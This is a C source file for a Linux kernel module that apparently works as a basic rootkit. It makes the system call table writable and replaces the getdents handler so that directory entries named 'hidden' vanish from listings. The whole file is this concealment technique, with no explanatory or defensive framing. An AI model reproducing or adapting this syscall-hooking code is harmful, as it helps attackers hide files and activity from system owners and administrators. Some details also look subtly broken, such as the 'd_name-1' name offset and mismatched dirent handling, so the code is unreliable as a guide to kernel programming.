#include "include.h"
#include "rw.h"
#include "syscall.h"
#include "utility.h"
MODULE_LICENSE("GPL");

//char* arg;
//module_param(arg, charp, 0);


SYS_getdents_type orig_syscall; /*the original systemcall*/

void hidename(char* buf, int* nread, char* name, int BUF_SIZE) {
	int i;
	struct linux_dirent64* dirent;
	char* tempbuf;
	int tempnread;
	i = 0;
	tempbuf = kmalloc(BUF_SIZE, GFP_KERNEL);
	tempnread = 0;


	while (i < *nread) {
		dirent = (struct linux_dirent64*) (buf + i);
		printk("%s\n", dirent->d_name-1);
		if (!strcmp(dirent->d_name-1, name)) {
			printk("###hiding###\n");

		}
		else {
			memcpy(tempbuf + tempnread, dirent, dirent->d_reclen);
			tempnread += dirent->d_reclen;
		}
		i += dirent->d_reclen;
	}
	memcpy(buf, tempbuf, *nread);
	*nread = tempnread;
	kfree(tempbuf);
}


int replace_syscall(int fd, char* buf, int BUF_SIZE) {
	int nread;
	nread = orig_syscall(fd, buf, BUF_SIZE);
	if (nread <= 0) {
		return nread;
	}
	hidename(buf, &nread, "hidden", BUF_SIZE);
	return nread;
}

int init_module() {
	make_rw(sys_call_table);
	orig_syscall = (SYS_getdents_type) sys_call_table[SYS_getdents];
	sys_call_table[SYS_getdents] = (syscall)replace_syscall;
	printk(KERN_INFO "Module loaded\n");
	return 0;
}

void cleanup_module() {
	sys_call_table[SYS_getdents] = (syscall)orig_syscall;
	printk(KERN_INFO "Module unloaded\n");
}
